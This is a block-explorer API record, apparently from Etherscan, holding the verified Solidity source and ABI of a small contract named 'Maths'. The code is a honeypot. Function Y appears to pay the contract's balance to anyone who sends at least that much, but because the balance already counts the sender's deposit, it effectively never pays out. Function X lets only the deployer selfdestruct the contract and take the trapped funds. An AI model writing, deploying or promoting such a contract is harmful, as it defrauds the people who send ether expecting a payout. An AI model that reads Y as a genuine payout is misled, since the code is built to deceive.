{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\ncontract Maths\r\n{\r\n    address Z = msg.sender;\r\n    function() public payable {}\r\n    function X() public { if (msg.sender==Z) selfdestruct(msg.sender); }\r\n    function Y() public payable { if (msg.value >= this.balance) msg.sender.transfer(this.balance); }\r\n }","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"Y\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"X\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Maths","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://619b6418943f603330d55d16ad1ae4bae6e2809d866a515ec72be118f2c71f0d"}]}